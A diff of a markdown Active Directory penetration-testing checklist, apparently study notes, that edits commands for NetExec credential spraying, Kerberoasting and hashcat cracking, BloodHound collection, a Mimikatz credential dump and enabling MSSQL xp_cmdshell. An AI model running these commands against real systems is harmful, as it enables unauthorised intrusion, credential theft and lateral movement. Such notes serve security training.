@@ -5,15 +5,12 @@ Test everything systematically with NetExec to avoid missing access.
 
 ## Whenever You Get New Credentials (ALWAYS RUN THIS)
 
-**Credentials found:** `___________:___________` (write them down!)
-
 ### Test Credential Validity Across Protocols
-
-- [ ] Test SMB: `netexec smb <DC-IP> -u <user> -p '<password>'`
-- [ ] Test WinRM: `netexec winrm <DC-IP> -u <user> -p '<password>'`
-- [ ] Test LDAP: `netexec ldap <DC-IP> -u <user> -p '<password>'`
-- [ ] Test MSSQL: `netexec mssql <DC-IP> -u <user> -p '<password>'`
-- [ ] Test RDP: `netexec rdp <DC-IP> -u <user> -p '<password>'`
+- SMB
+- WinRM
+- LDAP
+- MSSQL
+- RDP
 
 ### Spray Credentials Across All Domain Hosts
 
@@ -33,14 +30,14 @@ Test everything systematically with NetExec to avoid missing access.
 
 ## Kerberoasting (HIGH PRIORITY - Always Try)
 
-- [ ] Kerberoast from Linux: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request`
-- [ ] Save hashes to file: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.hash`
+- [ ] Find SPN users from Linux: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request`
+- [ ] Save hashes: `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.hash`
 - [ ] Crack immediately: `hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt`
 - [ ] If cracked, **GO BACK TO TOP** and test new credentials
 
 ## BloodHound Collection (CRITICAL - Don't Skip)
 
-- [ ] Collect from Linux: `bloodhound-python -u <user> -p '<password>' -d <domain> -dc <DC-IP> -c All --zip`
+- [ ] [[Active Directory#Run SharpHound|Run SharpHound]]
 - [ ] Upload to BloodHound and analyze
 - [ ] Check "Shortest Path to Domain Admins" from owned user
 - [ ] Mark compromised users as "Owned" in BloodHound
@@ -59,8 +56,8 @@ Test everything systematically with NetExec to avoid missing access.
 Then continue domain enumeration:
 
 - [ ] Check if machine has multiple NICs: `ipconfig /all` (pivot needed?)
-- [ ] Run SharpHound on Windows: `.\SharpHound.exe -c All --zip`
-- [ ] Dump credentials with Mimikatz: `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`
+- [ ] [[Active Directory#Run SharpHound|Run SharpHound]]
+- [ ] Dump credentials with Mimikatz: [[Windows Privilege Escalation#Mimikatz logonpasswords|Mimikatz logonpasswords]]
 - [ ] **For each new credential found, GO BACK TO TOP** and test across domain
 
 ## MSSQL Access (If netexec Shows MSSQL Access)
@@ -70,23 +67,6 @@ Then continue domain enumeration:
 - [ ] Try to enable xp_cmdshell: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
 - [ ] Execute commands: `xp_cmdshell 'whoami'`
 - [ ] Get reverse shell if xp_cmdshell works
-
-## Lateral Movement Tracking
-
-**Keep track of access (update this as you go):**
-
-### Compromised Accounts:
-```
-User: ___________  Password: ___________  Access: [ ] WinRM [ ] SMB [ ] MSSQL
-User: ___________  Hash: ___________      Access: [ ] WinRM [ ] SMB [ ] MSSQL
-```
-
-### Compromised Hosts:
-```
-[ ] MS01 - Access: ___________
-[ ] MS02 - Access: ___________
-[ ] DC01 - Access: ___________
-```
 
 ## Common Pitfalls
 
@@ -106,14 +86,6 @@ User: ___________  Hash: ___________      Access: [ ] WinRM [ ] SMB [ ] MSSQL
 - ❌ "Password doesn't work with domain auth" → Try `--local-auth` for local accounts
 - ❌ "I got access to one machine, done" → WRONG. Enumerate that machine, get more creds, repeat
 
-## Quick Reference
-
-- NetExec protocols: `smb`, `winrm`, `ldap`, `mssql`, `rdp`, `ssh`
-- Hash format for NetExec: `-H <NTLM hash>` (just NTLM, not LM:NTLM)
-- Local auth flag: `--local-auth` (for non-domain accounts)
-- Shares enumeration: `--shares`
-- Password policy: `--pass-pol`
-
 ## Reference
 
-For detailed AD methodology, see [[Active Directory Attack Chain]]
+For detailed AD methodology, see [[Active Directory]]
